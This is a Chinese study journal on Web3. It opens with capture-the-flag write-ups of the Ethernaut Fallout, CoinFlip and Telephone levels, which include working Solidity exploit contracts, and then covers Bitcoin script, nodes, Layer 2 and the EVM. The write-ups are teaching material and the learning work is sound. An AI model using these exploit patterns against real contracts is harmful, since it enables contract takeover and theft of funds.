contract Fallout {

using SafeMath for uint256;

//把 SafeMath 库里所有 以 uint256 作为第一个参数 的函数，“挂”到 uint256 类型

之后写 x.add(y) 就能自动转成 SafeMath.add(x, y) ，防止加减乘除溢出。

mapping(address => uint256) allocations;

address payable public owner;

/\* constructor \*/

function Fal1out() public payable {

owner = msg.sender;

allocations\[owner\] = msg.value;

}

modifier onlyOwner() {

require(msg.sender == owner, "caller is not the owner");

\_;

}

function allocate() public payable {

allocations\[msg.sender\] = allocations\[msg.sender\].add(msg.value);

}

function sendAllocation(address payable allocator) public {

require(allocations\[allocator\] > 0);

allocator.transfer(allocations\[allocator\]);

}

function collectAllocations() public onlyOwner {

msg.sender.transfer(address(this).balance);

}

function allocatorBalance(address allocator) public view returns (uint256) {

return allocations\[allocator\];

}

}

\`\`\`

该关卡的要求是获取合约的owner

\`\`\`solidity

/\* constructor \*/

function Fal1out() public payable {

owner = msg.sender;

allocations\[owner\] = msg.value;

}

\`\`\`

构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。

\# CoinFlip

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract CoinFlip {

uint256 public consecutiveWins;

uint256 lastHash;

uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor() {

consecutiveWins = 0;

}

function flip(bool \_guess) public returns (bool) {

uint256 blockValue = uint256(blockhash(block.number - 1));

if (lastHash == blockValue) {

revert();

}

lastHash = blockValue;

uint256 coinFlip = blockValue / FACTOR;

bool side = coinFlaip == 1 ? true : false;

if (side == \_guess) {

consecutiveWins++;

return true;

} else {

consecutiveWins = 0;

return false;

}

}

}

\`\`\`

抛硬币 游戏合约，

游戏逻辑（理想版）

用上一区块的哈希 blockhash(block.number-1) 做随机源

哈希除以一个大数 FACTOR ，把最高位挤出来当 0/1

猜对了 consecutiveWins++ ，猜错清零

但是blockhash可预测

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract Hack {

CoinFlip public immutable target;

uint256 private constant FACTOR =

57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(address \_target) {

target = CoinFlip(\_target);

}

/// 必须在新区块里调用，否则 revert

function attack() external {

uint256 blockValue = uint256(blockhash(block.number - 1));

require(blockValue != 0, "block too early");

uint256 coinFlip = blockValue / FACTOR;

bool side = coinFlip == 1;

target.flip(side); // 百发百中

}

}

\`\`\`

\# Telephone

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Telephone {

address public owner;

constructor() {

owner = msg.sender;

}

function changeOwner(address \_owner) public {

if (tx.origin != msg.sender) {

owner = \_owner;

}

}

}

\`\`\`

让msg.sender与tx.origin不相同即可，使用合约就可以实现。

\+ `tx.origin` 是发起整个交易的外部账户（钱包地址）。

\+ `msg.sender` 是当前调用者（可能是合约或外部账户）。

如果情景是直接由钱包调用合约，两者相同 ，但是如果是在多个合约的情况下，比如用户通过b合约来调用a合约，那么对于a合约来说，msg.sender就代表合约b，而tx.origin就代表用户钱包地址，所以我们这里需要另外部署一个合约来调用这儿的changeOwner：

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './Telephone.sol';

contract exp{

Telephone public immutable target;

address public owner;

constructor(){

owner = msg.sender;

//在 Solidity 中`msg.sender` 表示当前调用这个函数的实体；

//所以这里 \`msg.sender

//会是你的钱包地址；因此构造函数执行时，将部署者地址写入 owner

target=Telephone(0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9);//目标合约地址

}

function attack() public {

target.changeOwner(owner);

}

}

\`\`\`
<!-- DAILY_CHECKIN_2026-01-22_END -->

# 2026-01-21
<!-- DAILY_CHECKIN_2026-01-21_START -->












ai与web3

主题围绕 AI Agent（智能体）与 Web3 的结合，重点阐述了为什么 AI 需要 Web3 基础设施（身份、支付、可验证性），以及 SpoonOS 如何通过协议层（X402, C8004）和应用层解决这些问题。

背景与趋势 (The Shift to Agentic AI)

演进：AI 已从 2023 年的“聊天机器人”（Chatbot/Copilot）进化为 2026 年的“打工者”（Agent）。

区别：传统 LLM（无状态、无工具、无身份） vs. AI Agent（有记忆、有工具、有身份）。

核心痛点：Web2 架构下，AI 是“黑户”，缺乏独立身份、银行账户和可信的审计记录。

Web2 基础设施的三大缺失

身份缺失 (Identity)：无法验证请求发起者是人还是 AI，导致商业间谍、女巫攻击等问题。

不可审计 (Auditability)：AI 决策日志存储在中心化服务器，可被篡改，导致法律追责困难。

支付与结算障碍 (Payment)：传统金融（信用卡）不支持 AI 的高频、微额（0.001美元）交易，且结算周期长（T+1/T+3），无法满足 AI 秒级交互需求。

Web3 解决方案与架构

总览：Web3 为 AI 提供了“不可伪造的身份证”和“可编程的银行账户”。

协议层：

X402 协议 (Payment)：基于 HTTP 402 "Payment Required" 状态码，实现机器原生的微支付，支持毫秒级结算，无需注册/登录。

C8004 标准 (Identity)：AI 的“链上护照”。基于 ERC-721 实现，包含身份注册（Metadata）、信誉系统（基于链上交易的评分）、验证器（ZKML/TEE 证明）。

应用层 (SpoonOS)：

定位为 AI Agent 的“操作系统”或 SDK，封装了复杂的密钥管理、签名、链上交互。

四层架构：输入层（数据采集）-> 核心层（LLM/记忆/编排）-> 协议层（身份/支付）-> 输出层（DeFi/跨链操作）。

未来展望

机器经济（Machine Economy）将超越人类经济，稳定币交易量已超 Visa。

未来经济主体是数以亿计的 AI，它们需要 Web3 网络来承载高并发的价值流转。
<!-- DAILY_CHECKIN_2026-01-21_END -->

# 2026-01-20
<!-- DAILY_CHECKIN_2026-01-20_START -->













现在的WEB3生态，已经不是一个简单的比特币网络了，它演化成了一个庞大复杂的数字国家。我们可以用分层的方式来拆解它，就像理解一个城市的：地基、公路、水电煤、商业区。

!\[\[图库/4ed22e773aad38a08722fec6d1b90893\_MD5.png\]\]

\## 基础设施层 L0→L3

\### L0 底层传输层

它的主要作用是解决不同区块链，如比特币、以太坊、波卡等之间的通信和价值传输问题。

其代表项目有Polkadot和Cosmos。

这些项目并不想各自单独构建一个封闭的城市，而是致力于打造一个连接所有城市的国家高速公路网，实现区块链之间的互联互通。

\### L1 底层区块链

相当于城市的地基和基本法。它是一个独立的区块链系统，能够保障自身的安全。

其代表项目包括Bitcoin，被视为数字黄金；Ethereum，被称为世界计算机；Solana以及Avalanche，以高速链著称。

每个独立的区块链就像一座城市，拥有自己的法律体系，即共识机制和税收系统，也就是Gas费。

\### L2 扩容方案

类似于城市的高架桥和地铁。

由于在L1主链上进行交易，存在拥堵且手续费高昂的问题，所以L2扩容方案在主链旁边构建了高速通道，用于处理大量的小额交易，最终再将交易结果传回主链进行结算。

其核心目标是提升区块链的扩展性。代表项目有Optimism、Arbitrum以及Lightning Network。

L2扩容方案对支付领域意义重大！未来海量的微支付交易几乎必然会发生在L2上，因为其手续费极低且交易速度极快。

\### L3 应用链

就如同城市里的某个大型主题乐园。

当某个大型应用觉得在公共链上发展受到限制时，就会基于L2或L1的技术，搭建一个为自己量身定制的专属链。

目前的一种代表趋势是基于Cosmos SDK或OP Stack来构建特定应用链。

\## 中间件层，城市的水电煤

这一层不直接面向最终用户，但为上层应用提供关键服务。没有它们，应用层就是空中楼阁。

\### 预言机，区块链的事实来源

区块链本身是一个相对封闭的系统，无法直接获取链外的股票价格、天气数据、比赛结果等真实世界的信息。

!\[\[图库/5e7ecb1994fc21a113fdc59252602a3b\_MD5.png\]\]

图片来源：csdn-wonderBlock-预言机

而预言机就如同区块链的事实来源，负责将外部真实世界的数据可靠地传输给区块链上的智能合约。其代表项目是Chainlink。

举个例子

一个去中心化金融DeFi借贷协议需要实时了解以太坊ETH的价格，以此判断是否要对抵押资产进行清算，而这个ETH的实时价格数据就是由Chainlink提供的。

\### 节点服务，WEB3的云计算服务

节点服务相当于WEB3领域的云计算服务。并非每个开发者都愿意自己搭建节点来与区块链进行交互，节点服务提供商就应运而生。

这些公司会提供现成的应用程序编程接口，让开发者能够轻松地查询链上数据、发送交易。其代表项目有Infura和Alchemy。

对于WEB2开发者而言，节点服务是他们进入WEB3世界最常用的桥梁或工具。

\### 索引协议，区块链数据的搜索引擎

索引协议的作用类似于百度或谷歌。

由于区块链上的数据量极为庞大，犹如一片数据的海洋，那么如何才能快速查询到某个地址的所有交易记录呢？索引协议能够帮助高效地组织和查询这些数据。其代表项目是The Graph。

\## 应用层，普通人能看到的商业区

建立在底层设施之上、直接面向用户的应用层，是创新与财富效应最为集中的领域。

\### **DeFi，去中心化金融：以代码重构华尔街**

DeFi利用代码重新构建了整个华尔街的金融体系。无需银行、券商、交易所等传统中介机构，便可实现：

借贷，如Aave、Compound；交易，如Uniswap、Sushiswap；衍生品交易，如dYdX；生息，如Yearn等所有金融活动。

其核心创新在于AMM，自动化做市商机制，以Uniswap为例，它允许任何人无需许可地为任意交易对提供流动性，即做市，并赚取费用，彻底颠覆了传统的订单簿模式。

\### **NFT，非同质化代币：数字所有权凭证**

NFT是数字所有权证书，它不仅仅局限于JPEG图片，更是任何独一无二的数字资产，甚至实物资产的所有权凭证。

!\[\[图库/1c3434f245fcf777e819e7d171788345\_MD5.png\]\]

其应用场景广泛，涵盖：

数字艺术，如CryptoPunks；藏品，如NBA Top Shot；游戏资产，如Axie Infinity；身份认证，如域名ENS；门票、房地产等多个领域。

\### **DAO，去中心化自治组织：以代码制定规则的社区与公司**

DAO是通过代码设定规则的公司或社区。成员通过持有代币进行投票决策，社区或公司的金库资金由多签钱包或智能合约管理，实现了无人化管理与全球协同。

!\[\[图库/94abec4b8cbe54f362ccaf283133f59e\_MD5.png\]\]

代表项目有ConstitutionDAO，曾试图拍卖美国宪法；BitDAO，大型风投DAO等。
<!-- DAILY_CHECKIN_2026-01-20_END -->

# 2026-01-19
<!-- DAILY_CHECKIN_2026-01-19_START -->














\## 脚本

\### 一、本质

比特币脚本根本不是“编程语言”，它是一个被故意打残的、不可图灵完备的 Forth 系栈机。

唯一任务：在你花钱那一刻，回答一个问题——「这笔 UTXO 现在能不能被花？」。

比特币里根本没有“账户余额”，只有一堆带锁的小钱箱（UTXO）

每个 UTXO 就是一个结构体，里面只有两样关键东西：

\+ 多少 BTC

\+ 一段“锁脚本”（ScriptPubKey）

想花它，就必须给矿工证明：我能配出一段“解锁脚本”，把它和锁脚本拼接后，在比特币虚拟机里执行结果为 TRUE。

\### 二、核心设计限制（为什么这么残）

\+ 无循环、无跳转（彻底杜绝 while、for、goto）

\+ 栈最大 1000 项，脚本最大 10 000 字节（防栈溢出、DoS）

\+ 大量 opcode 早被 Satoshi 永久禁用（OP\_CAT、OP\_MUL、OP\_AND 等）

\+ 不能读取链上其他状态、不能读时间（除非你主动塞进交易里）

\+ 执行路径 100% 确定，任何节点跑出来结果都一模一样

→ 相当于一个开了全防护（canary + RELRO + seccomp + no-exec-stack）的超残血 VM

\### 三、上锁 vs 解锁完整流程（P2PKH 现场打靶）

UTXO 里永远只存一把锁（Locking Script = ScriptPubKey）

最常见写法（1… 和 bc1q… 地址）：

\`\`\`plain

OP\_DUP OP\_HASH160 <20字节 pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG

\`\`\`

你花钱时在 input 里提供钥匙（Unlocking Script = ScriptSig / Witness）：

\`\`\`plain

<签名> <完整公钥>

\`\`\`

矿工会把这两段拼接成下面这根“ROP 链”，然后丢进脚本虚拟机执行：

\`\`\`plain

<签名> <公钥> OP\_DUP OP\_HASH160 <pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG

\`\`\`

执行过程逐条 opcode（你自己推栈就能 100% 复现）：

| 步骤 | 操作 | 栈（从底→顶） | 备注 |

| --- | ------------------- | ------------------------------ | ------------------- |

| 1 | push 签名 | \[sig\] | |

| 2 | push 公钥 | \[sig, pubkey\] | |

| 3 | OP\_DUP | \[sig, pubkey, pubkey\] | 复制一份公钥 |

| 4 | OP\_HASH160 | \[sig, pubkey, hash160(pubkey)\] | 计算公钥哈希 |

| 5 | push 锁里的 pubkeyhash | \[sig, pubkey, h1, h2\] | |

| 6 | OP\_EQUALVERIFY | \[sig, pubkey\] | h1 == h2？不相等直接 Fail |

| 7 | OP\_CHECKSIG | \[TRUE 或 FALSE\] | 用公钥验签，验证是否对本交易签名 |

最后栈顶剩下非零值（TRUE）→ 矿工放行，钱归你花。
<!-- DAILY_CHECKIN_2026-01-19_END -->

# 2026-01-16
<!-- DAILY_CHECKIN_2026-01-16_START -->















\## 比特币节点

**比特币节点（Bitcoin Node）= 参与比特币网络的计算机**，运行Bitcoin Core 或其他兼容实现。

节点的三项主要工作：

1\. **验证区块与交易**（共识规则）

2\. **维护区块链数据**

3\. **转发数据给其他节点（P2P 网络）**

\### 🧱 全节点（Full Node）

全节点会 **下载完整区块链数据**，并 **独立验证所有历史交易和区块**。

\+ 下载所有区块（> 500 GB）

\+ 对每一条交易重新执行验证规则

\+ 自己决定某笔交易是否合法

（不依赖任何第三方）

\#### 权限级别

全节点 = **最可信**

它只相信自己验证过的结果。

\#### 👍 优点

\+ 最高安全性

\+ 不信任别人

\+ 不会被骗（double-spend 陷阱等）

\#### 👎 缺点

\+ 占用大存储

\+ 同步时间长（首次同步很慢）

\### 🪶 轻节点（Light Node / SPV Node）

轻节点 **不下载完整区块链**，只下载：

\+ 区块头（header）

\+ 少量相关验证信息（Merkle proof）

轻节点依赖全节点帮它验证交易。

\#### 📦 SPV（Simplified Payment Verification）

轻节点通过 SPV 技术验证交易：

\+ 不复算所有交易

\+ 只检查交易是否出现在某个区块（Merkle 路径）

\+ 相信全节点广播的信息

\#### 👍 优点

\+ 小、快、无需大量空间

\+ 适合手机、网页钱包

\#### 👎 缺点

\+ 必须信任全节点提供的数据

\+ 存在被欺骗的可能（误导的区块信息）

\---

\### 📌为什么比特币需要轻节点？

因为：

\+ 手机存不下 500+ GB 的链数据

\+ 同步太慢

\+ 用户需要快速参与网络

轻节点用 SPV 方式让普通设备也能参与验证（虽然不完全可信）。
<!-- DAILY_CHECKIN_2026-01-16_END -->

# 2026-01-15
<!-- DAILY_CHECKIN_2026-01-15_START -->
















\## 区块结构

区块头

!\[\[图库/45f941bff426ac8f15fa644d236c5101\_MD5.jpg\]\]

| 字段 | 含义（简洁） | pwn 类比 |

| ----------------------- | --------------- | ----------------------- |

| **Version** | 节点使用哪代规则 | “struct version 字段” |

| **Previous Block Hash** | 指向上一个区块 | 链表里的 `prev`<br/> 指针 |

| **Merkle Root** | 所有交易的哈希树根 | 整个交易池的“总校验和” |

| **Timestamp** | 区块时间戳 | 日志的 timestamp 字段 |

| **nBits（target）** | 挖矿难度 | 你设置的过关条件 |

| **Nonce** | 为找到目标哈希而不断变的随机数 | brute force fuzzing 随机值 |

\## 数据结构Merkle hash（保证区块不可篡改）

**Merkle Hash = 把大量数据分层哈希形成一棵树，最后得到一个根哈希（Merkle Root）用作整体的校验证明。**

换句话说：

它是一个 **多级 hash 结构**，用来证明“某个数据属于某个大集合”。 如一笔交易 Tx）确实属于某个 Merkle Root 对应的集合。

例如：

你从区块头里看到 Merkle Root = R，

现在别人告诉你：Tx3 在这个区块，他给了你一组 Merkle 证明（Merkle Proof）

**这样首先是极大地提高了区块链的运行效率和可扩展性，使得区块头只需包含根哈希值而不必封装所有底层数据，这使得哈希运算可以高效地运行在智能手机甚至物联网设备上；其次是Merkle Tree可支持“简化支付验证协议”（SPV），即在不运行完整区块链网络节点的情况下，也能够对交易数据进行检验。**

!\[\[图库/9f1f1cb18a33d3e8768c7332f4a4e0b4\_MD5.webp\]\]

\## 网络

**比特币的 P2P 网络就是一个没有中心服务器的节点广播网络，所有节点互相直接通信，交换交易和区块。**

\+ 不需要服务器

\+ 不需要许可

\+ 任意节点都能加入

\+ 所有数据靠广播同步

就像一个“去中心化聊天室”，只是大家不是发消息，而是发交易和区块。

\### 网络是怎么连接的？

每个节点启动时会：

1\. 连接一些已知的 seed 节点（DNS seeds）

2\. 获取其他节点的 IP（地址簇）

3\. 随机挑选若干个节点建立 TCP 连接（通常 8 个出向连接），即邻居节点，但是不在物理相邻

之后节点之间就保持长连接，互相交换数据包。

\---

\### 数据传播（Gossip 协议）

比特币使用一种很简单的 **gossip（八卦式）传播机制**：

1\. 节点收到一笔交易/区块

2\. 只告诉一部分邻居 “我有新东西”

3\. 对方如果没有，就来请求

4\. 然后继续传播给它的邻居

最终数据会快速扩散到全网。

\---

\### 如何防垃圾/攻击？

比特币网络有若干保护措施：

\+ **Rate limiting**：限制发送频率

\+ **Ban score**：恶意行为会被拉黑一段时间

\+ **数据结构验证**：收到的消息必须符合协议格式

\+ **区块/交易必须满足共识规则**，否则不传播

\---

\### 节点主要交换哪些数据？

节点之间的消息有几类（精简）：

\+ `inv`：我这里有新交易/区块

\+ `getdata`：我要这个数据

\+ `tx`：传交易

\+ `block`：传区块

\+ `ping/pong`：保持连接

\+ `addr`：分享节点 IP

属于一个非常经典的 P2P 协议。
<!-- DAILY_CHECKIN_2026-01-15_END -->

# 2026-01-14
<!-- DAILY_CHECKIN_2026-01-14_START -->

















\# 钱包地址生成逻辑

!\[\[图库/dfa1465c6710908114e7c40bbffa7e06\_MD5.jpg\]\]

\# 钱包作用

一句话概括

**MetaMask 是一个以太坊钱包 + 浏览器插件，用来管理你的私钥、存放资产、发交易，并让你在网页上直接使用区块链应用（DApp）。**

就像：

**它是你在区块链世界的“钥匙串 + 浏览器驱动 + 交易签名器”。**

| **功能** | **作用** |

| ----------- | ------------------------- |

| **私钥管理** | **保存并加密你的助记词/私钥** |

| **资产管理** | **显示 ETH / ERC20 / NFT** |

| **交易签名** | **每笔链上动作都要它签名** |

| **DApp 连接** | **登录、swap、mint、GameFi** |

| **多链支持** | **以太坊 + Polygon + BSC 等** |

\## MetaMask 的核心功能

\### **1️⃣**\*\* 管理你的私钥（最重要）\*\*

\+ MetaMask 本质是一个“私钥管理器”，帮你安全存储私钥/助记词。

\+ 私钥永远不会上传网络，只在本地加密保存。

🔐 **你签的每笔链上交易，都是 MetaMask 帮你用私钥签出来的。**

\---

\### **2️⃣**\*\* 发送和接收加密资产\*\*

\+ 你可以在钱包里收发 ETH、USDT、NFT 等 ERC-20/ERC-721 资产。

\+ MetaMask 会显示你的余额、gas 费、交易记录等。

\---

\### **3️⃣**\*\* 连接去中心化应用（DApp）\*\*

这是最关键的用途。

当你访问 DApp（如 Uniswap、OpenSea、Lens、GameFi 项目）时，网站会弹出：

“Connect to MetaMask”

然后你就可以：

\+ 签名登录（类似 Web2 登录）

\+ 跑 swap、mint NFT、借贷、质押

\+ 玩链游

\+ 使用各种 DeFi 协议

**MetaMask 就是 DApp 的“钱包驱动”。**

\---

\### **4️⃣**\*\* 作为浏览器插件注入 web3 对象\*\*

对前端开发来说，MetaMask 会向网页注入 `window.ethereum`，

让网页可以调用链上 RPC，例如：

\`\`\`plain

ethereum.request({ method: 'eth\_requestAccounts' })

\`\`\`

没有 MetaMask，网页根本没办法签交易或访问你的链上账户。

\### **5️⃣**\*\* 网络切换（主网 & 测试网 & EVM 链）\*\*

MetaMask 支持：

\+ Ethereum 主网

\+ Polygon、BSC、Arbitrum、Optimism 等 EVM 链

\+ Goerli、Sepolia 等测试网

还能自定义 RPC。

等于一个钱包支持全套 EVM 生态。
<!-- DAILY_CHECKIN_2026-01-14_END -->

# 2026-01-13
<!-- DAILY_CHECKIN_2026-01-13_START -->


















视频1是 Austin Griffith **“Web2 to Web3” 四周特训营**的开篇介绍，核心要点：这是从传统开发转向 Solidity 开发的路线图，强调动手实践（Shipping），并将“安全审计”定义为技术进阶的终极目标。

\### 扩展层（Layer2）

**为什么需要 Layer2**

1\. **以太坊 L1 吞吐量极低（~15 TPS）**

所有节点必须重复执行所有交易，无法提升执行能力。

2\. **Gas 昂贵、链易拥堵**

大量应用（DeFi、NFT、游戏）无法在 L1 承担高成本。

Layer2 是构建在以太坊 L1 之上的\*\*扩展执行环境\*\*，目标是：

1\. **提高吞吐量（TPS）**

2\. **降低交易成本（Gas）**

3\. **保持以太坊主链安全性（最终性与数据可用性）**

核心思想：

\`\`\`plain

执行在 Layer2，安全在 Layer1。

\`\`\`

L2 将大量计算从 L1 挪到链外，但最终结果仍必须通过 L1 验证或结算。

\#### 两大主流路线

\##### Optimistic Rollup（以“欺诈证明”生效）

**代表：**Optimism、Arbitrum

**执行流程：**

1\. L2 执行所有交易（EVM 等价）

2\. 将交易数据或状态根批量上报至 L1

3\. 假设（optimistic）结果是正确的

4\. 有“挑战窗口”（如 7 天）

5\. 若有人质疑 → 执行 fraud proof，即验证器在 L1 上重放某段执行来检查是否造假

**特点：**

| 指标 | 特性 |

| --- | --- |

| 安全性 | 基于争议解决机制 + 挑战者经济激励 |

| 延迟 | 有挑战窗口（通常几天） |

| 兼容性 | 原生 EVM（Arbitrum Stylus 扩展 WebAssembly） |

| 成本 | 较低 |

\##### 3.2 ZK Rollup（以“有效性证明”生效）

**代表：**zkSync、StarkNet、Scroll、Polygon zkEVM

**核心思路：L1 只需要一次“Verify(proof)”即可确认状态合法。**

\+ L2 执行交易

\+ 构造零知识证明（ZKP）

\+ L1 仅需验证证明（快速、成本低）而无需重放执行

**特点：**

| 指标 | 特性 |

| --- | --- |

| 安全性 | 密码学强保证，无需挑战窗口 |

| 延迟 | 无需等待，可快速 finality |

| 计算成本 | 生成证明耗时高（链下重计算） |

| 兼容性 | zkEVM 系列努力做到与 EVM 字节码等价 |

**ZK 的显著优势：**

\+ 抗攻击性强：结果“数学上正确”，攻击者无法注入错误状态

\+ 低延迟转账和提现

\### 应用层

核心作用：基于以太坊底层技术开发的各类实际应用，是 “世界计算机” 的 “软件应用程序”，直接面向用户提供服务

常见应用类型：

去中心化金融（DeFi）：如借贷平台（Aave）、去中心化交易所（Uniswap）

非同质化代币（NFT）：如数字艺术品交易（OpenSea）、NFT 游戏

去中心化应用（DApp）：如社交应用、供应链溯源应用等

核心特点：依托底层四层结构的安全性与去中心化特性，无需依赖中心化机构即可运行，用户对自身数据与资产拥有更高控制权

\## DApp

\### 1. 核心定义：什么是 dApp？

\> **dApp = 链上智能合约（后端） + 链下用户界面（前端）**

它不像传统 App 那样把后端代码跑在阿里云或 AWS 的中心化服务器上，而是把核心逻辑（资金处理、业务规则）部署在\*\*以太坊区块链\*\*上。

• dApp 的后端代码 （智能合约）运行在以太坊主网或其 Rollup （二层网 络）之上的 EVM 中，由全网节点共同执行和记录；

• dApp 的前端可以用任意 Web / App 技术编写，既可以放在传统服务器 上，也可以托管在 IPFS、Arweave 等去中心化存储上。

\### 2. 架构对比：Web2 vs Web3

\- **传统 App (Web2)**：

\- **后端**：中心化服务器（可随时关机、随时由管理员修改数据）。

\- **信任模型**：信任“公司”不作恶。

\- **dApp (Web3)**：

\- **后端**：智能合约（运行在去中心化的 EVM 节点网络中）。

\- **数据**：存储在公开透明的区块链上。

\- **信任模型**：信任“代码”和“共识规则”（Code is Law）。

\### 3. dApp 的关键特性（双刃剑）

\- **零停机时间 (Zero Downtime)**：没有“总机房”，只要以太坊网络还在，后端就永远在线。

\- **抗审查 (Censorship Resistance)**：没有单一机构能按下“删除键”或阻止特定用户交互。

\- **代码不可篡改 (Immutability)**：这是最大的特性，也是最大的挑战。合约一旦部署，逻辑通常就无法直接修改（除非预留了代理升级模式）。
<!-- DAILY_CHECKIN_2026-01-13_END -->

# 2026-01-12
<!-- DAILY_CHECKIN_2026-01-12_START -->



















\# 以太坊（世界计算机）

以太坊被称为 “世界计算机”，核心是它突破了比特币仅能处理简单价值转移的局限，靠去中心化架构、图灵完备的智能合约等技术，构建了一个全球可访问、能承载复杂计算与多样化应用的分布式计算平台。下面以计算机五层结构拆解分析

\## 五层结构

\### 硬件层

核心作用：为整个以太坊网络提供物理硬件支持，是 “世界计算机” 的 “硬件主机”

组成部分：全球范围内参与以太坊网络的节点设备，包括个人电脑、服务器、专业矿机（合并后以验证节点设备为主）等

关键特点：去中心化分布，无单一控制中心，节点越多，网络安全性、稳定性越强，确保 “世界计算机” 持续运行不宕机

\### 内核层（操作系统层）

核心作用： 在这些不可信硬件上，实现“一个统一的状态机 + 资源调度”

核心功能：pos权益证明机制，gas机制

1\. 把所有节点连成一个 P2P 网络（网络子系统）

2\. 在节点之间达成“\*\*谁的区块算数\*\*”的共识（共识子系统）

3\. 控制“\*\*谁先来打包交易谁来验证交易、每个区块能装多少东西\*\*”（调度/调度器）

4\. 控制“\*\*每个操作要花多少资源 / 钱\*\*”（资源管理：Gas & Fee Market）

5\. 把“执行层（EVM）”的状态转移结果纳入全局（状态机转移接口）

\#### pos权益证明机制

当前共识机制：权益证明（PoS），取代原有的工作量证明（PoW）

原理：节点通过质押一定数量的 ETH 成为验证者，按规则打包交易、生成区块，合规则验证者获得奖励，违规者将被惩罚（扣除质押的 ETH）

优势：降低能源消耗，提升网络效率，同时通过 “质押成本” 保障节点诚实性

\#### gas

1\. **资源计量与成本化**

所有 EVM 操作（opcode）都有固定 gas 消耗，gas 用于精确计量“计算量 + 存储 + 带宽”。

通过让执行成本显式化，确保链上资源稀缺可定价。

2\. **防止 DoS 与无限计算**

交易必须预付 gas，执行过程中 gas 用尽会被中止。

这使得任何无限循环、恶意大计算、垃圾交易都无法无成本消耗网络资源。

3\. **交易排序与拥堵调节（Fee Market）**

Gas price/priority fee 作为经济信号，在拥堵情况下让用户竞争区块空间。

节点根据费用从高到低选择交易，实现市场化调度。

总结：

**Gas = 区块链的资源管理系统，负责计量成本、防 DoS、调节交易优先级，是以太坊作为“世界计算机”能稳定运行的关键内核机制。**

\### 处理层（以太坊虚拟机EVM，全球同步的软件CPU）

EVM 是以太坊上的 **虚拟 CPU + 沙箱执行环境**，专门用来运行智能合约。它执行 bytecode，确保所有节点执行结果一致（确定性）。

\#### EVM 的执行模型（Execution Model）

EVM 执行一笔交易主要包含以下步骤：

1\. 加载交易

交易包含 to、value、data，用作智能合约调用的入口。

2\. 初始化执行上下文

包含：

\+ 程序计数器 PC

\+ 栈（stack）

\+ 内存（memory）

\+ 存储（storage）

\+ gas（燃料配额）

3\. 逐条执行 opcode

EVM 执行汇编级操作，包括算术、控制流、调用、存储、日志等。

4\. gas 用尽则 revert

执行中 gas 不够，会回滚所有状态修改，但已消耗的 gas 不退还。

\---

\#### EVM 的内存结构（Stack/Memory/Storage）

栈（Stack）

\+ LIFO 栈

\+ 最大深度 1024

\+ 所有 opcode 参数都来自栈顶

内存（Memory）

\+ 执行期间的临时数据区

\+ 线性扩展，执行结束即清空

存储（Storage）

\+ 合约的持久化状态

\+ 写入非常贵（类似写磁盘）

\---

\#### 合约间调用（CALL / DELEGATECALL）

CALL

\+ 新建一个独立的执行上下文

\+ 自己用自己的 storage

\+ 能转 ETH

DELEGATECALL

\+ 使用 **被调用合约的代码**

\+ 使用 **调用者的 storage（非常危险）**

\+ 是代理合约与许多漏洞的源头

（类比：把别人的函数在你的进程里执行，并用你的全局变量）

\---

\#### Solidity → EVM 的编译流程

1\. Solidity 源码

2\. 编译为 Yul（中间 IR）

3\. 编译为 EVM bytecode

4\. 部署到链上

5\. 由 EVM 逐条执行指令

（类比：C → LLVM IR → 汇编 → 机器码 → CPU）

\---

\#### EVM 的局限性

\+ 是纯栈机（无寄存器）

\+ 无浮点数

\+ 内存只增大不缩小

\+ CALL 返回值要手动检查

\+ DELEGATECALL 容易被利用

\+ 无线程和并发
<!-- DAILY_CHECKIN_2026-01-12_END -->
<!-- Content_END -->
